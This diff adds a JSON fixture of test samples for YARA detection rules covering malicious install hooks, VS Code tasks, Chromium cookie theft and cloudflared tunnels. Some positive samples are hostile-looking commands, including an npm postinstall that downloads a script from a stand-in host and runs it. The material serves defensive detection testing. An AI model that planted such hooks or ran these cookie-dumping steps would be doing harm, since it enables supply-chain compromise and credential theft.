@@ -1,0 +1,72 @@
+[
+  {
+    "rule": "ASPL_NPM_Install_Hook_Remote_Fetch",
+    "file": "rules/behavior/execution/npm_install_hook_remote_fetch.yar",
+    "positive": "{\"scripts\":{\"postinstall\":\"curl https://example.invalid/bootstrap.sh -o tmp.sh && sh tmp.sh\"}}",
+    "negative": [
+      "{\"scripts\":{\"postinstall\":\"node scripts/build.js\"}}",
+      "{\"homepage\":\"https://example.invalid\",\"scripts\":{\"test\":\"curl --version\"}}"
+    ],
+    "encoding": [
+      "utf8",
+      "utf16le"
+    ],
+    "limitation": "Synthetic inert package metadata verifies textual lifecycle-hook proximity only. Legitimate installers may match; runtime execution, package compromise and malicious intent are not established."
+  },
+  {
+    "rule": "ASPL_VSCode_Task_Remote_Shell",
+    "file": "rules/behavior/execution/vscode_task_remote_shell.yar",
+    "positive": "{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"bootstrap\",\"type\":\"shell\",\"command\":\"curl https://example.invalid/bootstrap.sh -o bootstrap.sh\"}]}",
+    "negative": [
+      "{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"build\",\"type\":\"shell\",\"command\":\"npm run build\"}]}",
+      "{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"open\",\"type\":\"process\",\"command\":\"curl\",\"args\":[\"https://example.invalid/\"]}]}"
+    ],
+    "encoding": [
+      "utf8",
+      "utf16le"
+    ],
+    "limitation": "Synthetic inert task JSON verifies textual markers only. Legitimate developer automation may match; execution or compromise is not proven."
+  },
+  {
+    "rule": "ASPL_Chromium_Cookie_MasterKey_Query",
+    "file": "rules/behavior/credential-access/chromium_cookie_masterkey_query.yar",
+    "positive": "Local State\\n\"encrypted_key\":\"INERT\"\\nNetwork\\\\Cookies\\nSELECT host_key, name, encrypted_value FROM cookies",
+    "negative": [
+      "Local State\\n\"encrypted_key\":\"INERT\"\\nPreferences",
+      "Network\\\\Cookies\\nSELECT host_key, name FROM cookies"
+    ],
+    "encoding": [
+      "utf8",
+      "utf16le"
+    ],
+    "limitation": "Synthetic inert browser-artifact text verifies static proximity only. Legitimate migration, backup, forensic and security tooling may match."
+  },
+  {
+    "rule": "ASPL_Chromium_CDP_Cookie_Dump",
+    "file": "rules/behavior/credential-access/chromium_cdp_cookie_dump.yar",
+    "positive": "chrome.exe --remote-debugging-port=9222\\nwebSocketDebuggerUrl\\nNetwork.getAllCookies",
+    "negative": [
+      "chrome.exe --remote-debugging-port=9222\\nwebSocketDebuggerUrl\\nPage.captureScreenshot",
+      "Network.getAllCookies\\nCookie export documentation"
+    ],
+    "encoding": [
+      "utf8",
+      "utf16le"
+    ],
+    "limitation": "Synthetic inert CDP text verifies marker proximity only. Browser automation and debugging tools may legitimately match."
+  },
+  {
+    "rule": "ASPL_Cloudflared_Local_Tunnel",
+    "file": "rules/behavior/remote-access/cloudflared_local_tunnel.yar",
+    "positive": "cloudflared tunnel --url http://localhost:8080",
+    "negative": [
+      "cloudflared tunnel list",
+      "cloudflared access tcp --hostname internal.example.invalid"
+    ],
+    "encoding": [
+      "utf8",
+      "utf16le"
+    ],
+    "limitation": "Synthetic inert command text verifies the narrow local tunnel syntax only. Legitimate administration and development use may match."
+  }
+]
